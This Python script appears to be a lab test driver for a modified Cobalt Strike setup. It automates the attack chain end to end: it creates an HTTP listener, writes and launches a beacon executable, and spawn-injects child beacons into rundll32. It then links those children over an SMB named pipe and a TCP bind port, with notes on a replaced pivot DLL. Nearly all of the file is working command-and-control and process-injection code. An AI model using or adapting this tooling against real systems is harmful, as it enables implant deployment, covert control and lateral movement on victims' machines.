# -*- coding: utf-8 -*-
r"""f_link_child.py - Round 25: F link-child with the CORRECT official composite.

Corrected root cause (retires the round-23 "TS payload selection" theory):
  the old driver used smb_link/tcp_link -> beacon_link($bid,".",$listener) ->
  TaskBeacon.linkToPayloadLocal -> LinkExplicit ONLY (cmd 68 pipe connect /
  cmd 0x0E tcp connect). Nothing ever spawned the bind child, so the pipe
  never existed -> link_start's 15s retry loop -> ERROR_FILE_NOT_FOUND.
  The observed "HTTP beacon child" was the driver's own `spawn http x64`
  step (the link parent), not a mis-selected payload.

Correct composite (TaskBeacon.Spawn(listener, arch) + linkToPayloadLocal):
  bspawn($pbid, "smb_f25", "x64")
    -> cmd 44 spawn+inject: exportLocal(bind_pipe) = resources/pivot.x64.dll
       (our replaced client sleeve) with pipename embedded in config
    -> Pause(1s) + cmd 68 auto-link \\.\pipe\f25pipe
  bspawn($pbid, "tcp_f25", "x64")
    -> cmd 44 spawn+inject: exportBindTCPStage (pivot.x64.dll, port config)
    -> Pause(1s) + cmd 0x0E ConnectExplicit 127.0.0.1:4451
"""
import os
import re
import subprocess
import time
from pathlib import Path

DIR = Path(r"C:\Users\Administrator\Desktop\cobaltstrike\cs-agscript-mcp\scripts")
LOG = DIR / "r1.log"
INBOX = DIR / "r1_inbox.txt"
ACK = DIR / "r1_ack.txt"

results = []


def send(cmd, *args):
    prev = ACK.read_text().strip() if ACK.exists() else ""
    line = "\t".join((cmd,) + tuple(str(a) for a in args)) + "\n"
    tmp = INBOX.with_suffix(".tmp")
    tmp.write_text(line, encoding="utf-8")
    os.replace(tmp, INBOX)
    for _ in range(40):
        time.sleep(0.5)
        try:
            cur = ACK.read_text().strip()
        except OSError:
            continue
        if cur and cur != prev:
            return cur
    return None


def wait_for(pattern, timeout=75.0):
    rx = re.compile(pattern, re.M)
    pos = len(LOG.read_text(encoding="utf-8", errors="replace")) if LOG.exists() else 0
    t0 = time.time()
    while time.time() - t0 < timeout:
        time.sleep(1.0)
        data = LOG.read_text(encoding="utf-8", errors="replace")
        chunk = data[pos:]
        m = rx.search(chunk)
        pos = len(data)
        if m:
            return m
    return None


def launch(exe):
    subprocess.run(["powershell", "-NoProfile", "-Command",
                    "Start-Process -FilePath '%s' -WorkingDirectory 'C:\\Users\\Public'" % exe],
                   capture_output=True)


def pipe_exists(name):
    r = subprocess.run(["powershell", "-NoProfile", "-Command",
                        "[System.IO.Directory]::GetFiles('\\\\.\\pipe\\') -match '%s'" % name],
                       capture_output=True, text=True)
    return bool(r.stdout.strip())


def main():
    # re-run hygiene: drop previous listeners (same-name rebind is rejected)
    for name in ("http_f25", "smb_f25", "tcp_f25"):
        send("listener_delete", name)
        time.sleep(0.5)
    # --- P0: fresh http parent (self-contained, no ev29 dependency) ---
    send("listener_create", "http_f25", "8095")
    time.sleep(1)
    send("artifact", "http_f25", "exe", "x64", "C:/Users/Public/beacon_f25.exe")
    launch("C:/Users/Public/beacon_f25.exe")
    m = wait_for(r"^\S+\s+INITIAL\t(\d+)\tnew beacon_f25\.exe", 75)
    if not m:
        results.append(("P0 parent INITIAL", False, "no INITIAL"))
        return finish()
    bid = m.group(1)
    send("target", bid)
    send("sleep", 5, 0)
    time.sleep(3)
    send("pwd")
    m0 = wait_for(r"^\S+\s+ALT\t" + bid + r"\t.{10,}", 60)
    results.append(("P0 parent pwd", bool(m0), "bid=%s" % bid))

    # --- P1: http spawn child (the link parent, 2nd hop) ---
    send("spawn", "http_f25", "x64")
    mp = wait_for(r"^\S+\s+INITIAL\t(\d+)\tnew rundll32\.exe", 100)
    if not mp:
        results.append(("P1 http child", False, "no spawn child"))
        return finish()
    pbid = mp.group(1)
    results.append(("P1 http child", True, "pbid=%s" % pbid))
    send("target", pbid)
    send("sleep", 5, 0)
    time.sleep(3)

    # --- P2: SMB link child via the CORRECT composite (spawn+auto-link) ---
    send("smb_listener_create", "smb_f25", "f25pipe")
    time.sleep(1)
    send("spawn", "smb_f25", "x64")
    # auxiliary evidence only: sample for the pipe in the background while we
    # wait for the INITIAL (link establishment can take ~60s with sleep+jitter;
    # the LS bytes in r1.log are the authoritative pass/fail, not this poll)
    pipe_seen = []
    import threading
    def poll_pipe():
        t0 = time.time()
        while time.time() - t0 < 120 and not pipe_seen:
            if pipe_exists("f25pipe"):
                pipe_seen.append(round(time.time() - t0, 1))
            time.sleep(2.0)
    threading.Thread(target=poll_pipe, daemon=True).start()
    # capture the position BEFORE waiting: the "established link" OUTPUT lands
    # in the same flush as (often just before) the INITIAL line - a fresh
    # wait_for() would skip bytes written before its call
    pos0 = len(LOG.read_text(encoding="utf-8", errors="replace")) if LOG.exists() else 0
    ms = wait_for(r"^\S+\s+INITIAL\t(\d+)\tnew rundll32\.exe", 120)
    window = LOG.read_text(encoding="utf-8", errors="replace")[pos0:] if LOG.exists() else ""
    link_smb = re.search(r"established link to child beacon", window)
    smb_ok = bool(ms) and bool(link_smb)
    if ms:
        send("target", ms.group(1))
        send("ls")
        ms2 = wait_for(r"^\S+\s+LS\t" + ms.group(1) + r"\t.{20,}", 75)
        smb_ok = bool(ms2) and bool(link_smb)
    pipe_seen_at = pipe_seen[0] if pipe_seen else None
    results.append(("P2 SMB link child", smb_ok,
                    "child=%s pipe@%ss" % (ms.group(1) if ms else "-", pipe_seen_at)))

    # --- P3: TCP link child via the composite (bind_tcp + auto-connect) ---
    send("target", pbid)
    send("tcp_listener_create", "tcp_f25", "4451")
    time.sleep(1)
    send("spawn", "tcp_f25", "x64")
    pos1 = len(LOG.read_text(encoding="utf-8", errors="replace")) if LOG.exists() else 0
    mt = wait_for(r"^\S+\s+INITIAL\t(\d+)\tnew rundll32\.exe", 120)
    window1 = LOG.read_text(encoding="utf-8", errors="replace")[pos1:] if LOG.exists() else ""
    link_tcp = re.search(r"established link to child beacon", window1)
    tcp_ok = bool(mt) and bool(link_tcp)
    if mt:
        send("target", mt.group(1))
        send("ls")
        mt2 = wait_for(r"^\S+\s+LS\t" + mt.group(1) + r"\t.{20,}", 75)
        tcp_ok = bool(mt2)
    results.append(("P3 TCP link child", tcp_ok,
                    "child=%s" % (mt.group(1) if mt else "-")))
    return finish()


def finish():
    print("== RESULTS ==", flush=True)
    npass = 0
    for name, ok, info in results:
        print("%-24s %-5s %s" % (name, "PASS" if ok else "FAIL", info), flush=True)
        npass += ok
    print("TOTAL: %d/%d" % (npass, len(results)), flush=True)


if __name__ == "__main__":
    main()
